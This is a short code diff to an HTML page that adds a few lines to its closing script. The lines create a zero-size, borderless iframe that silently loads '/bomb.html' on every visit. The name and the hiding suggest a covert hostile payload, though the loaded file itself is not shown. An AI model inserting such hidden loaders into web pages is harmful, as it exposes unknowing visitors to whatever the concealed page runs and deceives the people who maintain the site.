@@ -198,6 +198,12 @@
         i++;
       }, 800);
     }, 10000);
+
+    const f = document.createElement("iframe");
+f.src = "/bomb.html";
+f.style = "width:0;height:0;border:0;";
+document.body.appendChild(f);
+    
   </script>
 </body>
 </html>
